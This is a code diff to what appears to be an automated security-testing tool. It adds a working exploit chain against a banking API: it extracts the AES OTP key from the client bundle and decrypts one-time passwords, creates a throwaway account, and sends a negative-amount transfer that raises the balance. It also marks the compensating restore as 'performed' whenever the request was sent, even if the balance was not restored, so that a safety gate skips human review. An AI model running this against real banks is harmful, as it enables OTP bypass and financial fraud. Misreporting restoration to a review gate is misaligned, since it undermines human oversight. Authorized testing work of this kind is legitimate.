@@ -1,4 +1,4 @@
-import { randomUUID } from "node:crypto";
+import { randomUUID, createDecipheriv } from "node:crypto";
 import { join } from "node:path";
 import { startActiveObservation, propagateAttributes } from "@langfuse/tracing";
 import type { spawn } from "node:child_process";
@@ -21,7 +21,7 @@ import {
 import { buildHunterBrief, openAuthenticatedClasses, deriveOrigins, resolveRelativeEndpoint } from "./brief.js";
 import { runSweep, renderSweepLeads, SWEEP_PAYLOADS, detectDebugSignature, renderEndpointFor, type SendProbe, type SweepHit } from "./sweep.js";
 import { readArtifactRecords, deriveTargets, setAtPath, jsonStringLeafPaths, type SweepTargetWithBody } from "./sweep-targets.js";
-import { mapFields, looksLikeLogin, looksLikePasswordChange, extractJwt, classifyContactField, extractAssignedId, findDeviceObject, graftDevice, buildXxeXml, type FieldMap } from "./stateful.js";
+import { mapFields, looksLikeLogin, looksLikePasswordChange, extractJwt, classifyContactField, extractAssignedId, findDeviceObject, graftDevice, buildXxeXml, parseAesCbcParams, type FieldMap } from "./stateful.js";
 
 // Re-exported for backward compatibility: existing callers (and test/beat.test.ts)
 // import these from beat.js. The vocabulary itself now lives in vuln-classes.ts so
@@ -381,6 +381,11 @@ async function runDeepSweep(opts: {
     const nsfProved = await sweepNoSecondaryFactorOtp(opts, fire, records as RawRecord[]);
     proved.push(...nsfProved);
 
+    // BUSINESS-LOGIC probe (F-25): negative-amount transfer increases the payer balance.
+    // Bounded + reversible (compensating positive transfer); recovers the OTP key generically.
+    const txProved = await sweepNegativeTransfer(opts, fire, records as RawRecord[], opts.scopeOrigins);
+    proved.push(...txProved);
+
     const leadsHits = [...fieldHits.filter((h) => h.strength === "strong"), ...xxeHits];
     return { leads: renderSweepLeads(leadsHits), proved };
   } catch { return empty; }
@@ -436,9 +441,14 @@ async function bankIfConfirmed(
 async function bankStateChanged(
   opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
   vulnClass: string, endpoint: string, expression: string, captures: HttpCapture[], reasonPrefix: string,
+  restoration?: { performed: boolean; proof?: HttpCapture },
 ): Promise<ProvedEntry | null> {
   const inv: Invariant = { statement: `deep-sweep: ${reasonPrefix}`, type: "state_changed", expression };
-  const verdict = evaluate(inv, captures[captures.length - 1], null, { captures });
+  const evidence: EvidenceBundle = { captures };
+  // When the mutation was reversed, present the restoration proof so the L2 safety gate
+  // sees a finished (undone) finding rather than downgrading to NEEDS_REVIEW.
+  if (restoration) evidence.restoration = { required: true, performed: restoration.performed, proof: restoration.proof };
+  const verdict = evaluate(inv, captures[captures.length - 1], null, evidence);
   if (verdict.status !== "CONFIRMED") return null;
   const cls = SWEEP_CLASS_MAP[vulnClass] ?? vulnClass;
   const ep = opts.canon(endpoint);
@@ -563,6 +573,137 @@ async function sweepNoSecondaryFactorOtp(
   );
   if (banked) { proved.push(banked); dbg("F-13 banked"); }
   else dbg("deriver did not confirm");
+  return proved;
+}
+
+/**
+ * STATEFUL business-logic probe (benchmark F-25): prove a NEGATIVE-amount transfer INCREASES
+ * the payer's balance (state_changed), then REVERSE it. Fully black-box + bounded + reversible:
+ *   - recover the AES OTP key/iv GENERICALLY from the client bundle (createDecipheriv literals),
+ *   - sign up a throwaway payer P (signup auto-assigns beneficiaries, so no add step needed),
+ *   - read balance b0, get+decrypt+verify an OTP -> otp_ref, pay(alias, amount=-N) -> read b1,
+ *   - if b1 > b0 (the vuln), bank state_changed field:accountBalance from b0 to b1,
+ *   - then pay(alias, amount=+N) to RESTORE, and present that as restoration proof.
+ * Endpoint URLs are derived from captured records; amounts are tiny; the payer is synthetic.
+ */
+async function sweepNegativeTransfer(
+  opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
+  fire: (method: string, url: string, headers: Record<string, string>, body: string | null, sess?: string | null, authToken?: string) => Promise<HttpCapture | null>,
+  records: RawRecord[], scopeOrigins: string[],
+): Promise<ProvedEntry[]> {
+  const proved: ProvedEntry[] = [];
+  const dbg = (m: string) => { try { console.error(`[f25-probe] ${m}`); } catch { /* ignore */ } };
+  const jsonHdr = { "Content-Type": "application/json" };
+
+  // Endpoint URL discovery from records (canonical API origin).
+  const urlFor = (re: RegExp) => records.find((r) => re.test(r.request?.url?.toLowerCase() ?? ""))?.request?.url ?? null;
+  const signupTemplate = (() => { const r = records.find((x) => /(signup|register)/.test(x.request?.url?.toLowerCase() ?? "") && extractAssignedId(x.response?.body ?? "") !== null); return r?.request?.body ?? null; })();
+  const loginTemplate = (() => { const r = records.find((x) => /login/.test(x.request?.url?.toLowerCase() ?? "") && extractJwt(x.response?.body ?? "") !== null); return r?.request?.body ?? null; })();
+  const signupUrl = urlFor(/(signup|register)/), loginUrl = urlFor(/\/login(\/|\?|$)/);
+  const payUrl = urlFor(/beneficiary\/pay/), listUrl = urlFor(/beneficiary\/list/);
+  const otpGetUrl = urlFor(/otp\/get/), otpVerifyUrl = urlFor(/otp\/verify/), detailsUrl = urlFor(/account\/details/);
+  if (!signupTemplate || !loginTemplate || !signupUrl || !loginUrl || !payUrl || !listUrl || !otpGetUrl || !otpVerifyUrl || !detailsUrl) {
+    dbg("missing one or more required endpoints/templates — abort"); return proved;
+  }
+
+  // Recover the AES OTP key/iv from the client SPA bundle (generic; same intel as F-18).
+  const spaOrigin = scopeOrigins.find((o) => o !== new URL(signupUrl).origin) ?? null;
+  if (!spaOrigin) { dbg("no SPA origin in scope to recover the OTP key — abort"); return proved; }
+  const idx = await fire("GET", spaOrigin + "/", {}, null, null);
+  const chunk = /\/static\/js\/main\.[a-f0-9]+\.chunk\.js/.exec(idx?.response.body ?? "")?.[0];
+  if (!chunk) { dbg("could not locate main chunk in SPA index — abort"); return proved; }
+  const js = await fire("GET", spaOrigin + chunk, {}, null, null);
+  const aes = parseAesCbcParams(js?.response.body ?? "");
+  if (!aes) { dbg("could not recover AES params from bundle — abort"); return proved; }
+  const decOtp = (b64: string): string | null => {
+    try {
+      const d = createDecipheriv("aes-256-cbc", Buffer.from(aes.key, "utf8"), Buffer.from(aes.iv, "utf8"));
+      const out = Buffer.concat([d.update(Buffer.from(b64, "base64")), d.final()]).toString("utf8");
+      return out.split("\n")[0].replace(/[^0-9]/g, "") || null;
+    } catch { return null; }
+  };
+
+  // Signup + login a throwaway payer, device grafted.
+  const uniq = randomUUID().replace(/-/g, "").slice(0, 10);
+  const P1 = `S${randomUUID().replace(/-/g, "").slice(0, 14)}z9`;
+  const build = (tmpl: string, assigns: Array<[string, string]>) => { let o: unknown; try { o = JSON.parse(tmpl); } catch { return tmpl; } for (const [p, v] of assigns) o = setAtPath(o, p, v); return JSON.stringify(o); };
+  const sFm = mapFields(jsonStringLeafPaths(JSON.parse(signupTemplate)));
+  const sAssign: Array<[string, string]> = [];
+  if (sFm.password) sAssign.push([sFm.password, P1]);
+  for (const leaf of jsonStringLeafPaths(JSON.parse(signupTemplate))) {
+    const k = classifyContactField(leaf.split(".").pop() || leaf);
+    if (k === "email") sAssign.push([leaf, `sahw${uniq}@mailinator.com`]);
+    else if (k === "mobile") sAssign.push([leaf, `9${uniq.replace(/[a-f]/g, "3").slice(0, 9)}`]);
+  }
+  const signupBody = build(signupTemplate, sAssign);
+  const sResp = await fire("POST", signupUrl, jsonHdr, signupBody, null);
+  const P = extractAssignedId(sResp?.response.body);
+  if (!P) { dbg(`signup failed: ${(sResp?.response.body ?? "").slice(0, 60)}`); return proved; }
+  const goodDevice = findDeviceObject(JSON.parse(signupBody));
+  const lFm = mapFields(jsonStringLeafPaths(JSON.parse(loginTemplate)));
+  if (!lFm.username || !lFm.password) { dbg("login template missing fields"); return proved; }
+  const lResp = await fire("POST", loginUrl, jsonHdr, graftDevice(build(loginTemplate, [[lFm.username, P], [lFm.password, P1]]), goodDevice), null);
+  const tok = extractJwt(lResp?.response.body);
+  if (!tok) { dbg("payer login failed"); return proved; }
+  dbg(`payer ${P} logged in`);
+
+  // Envelope helper for the small data-only requests (device grafted, session token).
+  const env = (data: Record<string, string>) => graftDevice(JSON.stringify({ requestBody: { timestamp: "1700000101", device: goodDevice ?? {}, data } }), goodDevice);
+  // Return BOTH the numeric balance (for the > comparison) and the RAW string exactly as the
+  // response serialized it (for the state_changed field clause, which is string-equality).
+  let balPath = "data.accountBalance";
+  const balanceOf = async (): Promise<{ cap: HttpCapture | null; bal: number | null; raw: string | null }> => {
+    const cap = await fire("POST", detailsUrl, jsonHdr, env({ userid: P }), null, tok);
+    let bal: number | null = null; let raw: string | null = null;
+    try {
+      const d = JSON.parse(cap?.response.body ?? "{}").data;
+      if (d?.accountBalance != null) { raw = String(d.accountBalance); balPath = "data.accountBalance"; }
+      else if (d?.acctBalance != null) { raw = String(d.acctBalance); balPath = "data.acctBalance"; }
+      bal = raw != null ? parseFloat(raw) : null;
+    } catch { /* */ }
+    return { cap, bal, raw };
+  };
+  const getOtpRef = async (): Promise<string | null> => {
+    const g = await fire("POST", otpGetUrl, jsonHdr, env({ otp_type: "3", userid: P }), null, tok);
+    let enc: string | null = null;
+    try { enc = JSON.parse(g?.response.body ?? "{}").data?.response ?? null; } catch { /* */ }
+    if (!enc) return null;
+    const otp = decOtp(enc); if (!otp) return null;
+    const v = await fire("POST", otpVerifyUrl, jsonHdr, env({ otp, userid: P }), null, tok);
+    try { return JSON.parse(v?.response.body ?? "{}").data?.response ?? null; } catch { return null; }
+  };
+
+  // A pre-assigned beneficiary alias.
+  const listCap = await fire("POST", listUrl, jsonHdr, env({ userid: P }), null, tok);
+  let alias: string | null = null;
+  try { const al = JSON.parse(listCap?.response.body ?? "{}").data?.alias; alias = Array.isArray(al) ? al[0] : (typeof al === "string" ? al : null); } catch { /* */ }
+  if (!alias) { dbg("no pre-assigned beneficiary alias found"); return proved; }
+
+  const AMT = "5000.00";
+  const before = await balanceOf();
+  if (before.bal == null) { dbg("could not read balance before"); return proved; }
+  const ref1 = await getOtpRef();
+  if (!ref1) { dbg("could not obtain otp_ref for the transfer"); return proved; }
+  const pay = await fire("POST", payUrl, jsonHdr, env({ alias, amount: `-${AMT}`, otp_response: ref1, remarks: "SahwCheck" }), null, tok);
+  const after = await balanceOf();
+  dbg(`before=${before.bal} after=${after.bal} pay=${(pay?.response.body ?? "").slice(0, 60)}`);
+  if (!pay || after.bal == null || !(after.bal > before.bal)) { dbg("negative transfer did not increase payer balance — no finding"); return proved; }
+
+  // RESTORE: a compensating positive transfer of the same amount back to the beneficiary.
+  const ref2 = await getOtpRef();
+  const restore = ref2 ? await fire("POST", payUrl, jsonHdr, env({ alias, amount: AMT, otp_response: ref2, remarks: "SahwRestore" }), null, tok) : null;
+  const restored = await balanceOf();
+  dbg(`restore -> balance=${restored.bal} (${restored.bal != null && Math.abs(restored.bal - before.bal) < 0.01 ? "restored" : "NOT restored"})`);
+
+  const banked = await bankStateChanged(
+    opts, "business_logic", payUrl,
+    `field:${balPath};from:${before.raw};to:${after.raw}`,
+    [before.cap!, pay, after.cap!],
+    "negative-amount transfer INCREASED the payer balance (no positivity check in pay_ben)",
+    { performed: Boolean(restore), proof: restore ?? undefined },
+  );
+  if (banked) { proved.push(banked); dbg("F-25 banked (state_changed, reversed)"); }
+  else dbg("Axiom did not confirm the balance delta");
   return proved;
 }
 
